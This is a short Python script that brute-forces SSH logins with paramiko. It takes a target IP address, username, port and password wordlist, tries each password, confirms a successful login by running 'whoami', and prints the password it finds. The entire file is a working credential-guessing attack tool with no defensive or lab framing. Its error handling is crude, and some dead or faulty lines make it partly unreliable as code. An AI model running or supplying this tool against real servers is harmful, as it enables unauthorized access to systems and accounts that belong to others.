import paramiko, os, sys

def helpdesk():
    print("Usage : python ssh.py [IP ADDRESS] -u [SSH USER] -p [SSH PORT] -w [TXT WORDLIST]")

def checkArgs(arr):
    i,j,k,n = 0,0,0,0
    argv = arr
    for arr in argv:
        if(arr=="-u" or arr=="--username"):
            i += 1
        elif(arr=="-p" or arr=="--port"):
            j += 1
        elif(arr=="-w" or arr=="--wordlist"):
            k += 1
        else:
            n = 0
    if(i>1 or j>1 or k>1):
        print("Duplicated arguments!")
        return False
        sys._exit(0)
    else:
        return True

def checkCMD(arr,types):
    if types=="u":
        if("-u" in arr):
            return arr.index("-u") + 1
        else:
            return arr.index("--username") + 1
    elif types=="p":
        if("-p" in arr):
            return arr.index("-p") + 1
        else:
            return arr.index("--port") + 1
    elif types=="w":
        if("-w" in arr):
            return arr.index("-w") + 1
        else:
            return arr.index("--wordlist") + 1
    else:
        print("No Match!")
        os._exit(0)


def loadPass(password):
    f = open(password,"r")
    lines = f.readlines()
    return lines

def displayText(whoami,username):
    if(whoami==username):
        print("Password -> '{}' for address {} found!".format(passwd,sys.argv[1]))
        os._exit(0)

def _ssh(address,port,username,password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(address,port,username,password)
        stdin, stdout, stderr = ssh.exec_command('whoami')
        lines = stdout.readlines()
        displayText(lines[0].replace("\n",""),username)
    except:
        print("Trying password '{}' for address {}".format(password,address))


if(len(sys.argv)<=8):
    if(checkArgs(sys.argv)==True):
        try:
            port = checkCMD(sys.argv,"p")
            username = checkCMD(sys.argv,"u")
            words = checkCMD(sys.argv,"w")
            try:
                val = int(sys.argv[port])
                try:
                    lines = loadPass(sys.argv[words])
                    for line in lines:
                        passwd = line.replace("\n","")
                        _ssh(sys.argv[1],sys.argv[port],sys.argv[username],passwd)
                        
                except:
                    print("Wordlist doest not exist!")
            except ValueError:
                print("Port must be a digit!")
        except:
            try:
                username = checkCMD(sys.argv,"u")
                words = checkCMD(sys.argv,"w")
                default = 22
                try:
                    lines = loadPass(sys.argv[words])
                    for line in lines:
                        passwd = line.replace("\n","")
                        _ssh(sys.argv[1],default,sys.argv[username],passwd)
                except:
                    print("Wordlist doest not exist!")
            except:
                helpdesk()
else:
    print("Command out of range! {}\n".format(len(sys.argv)))
    helpdesk()
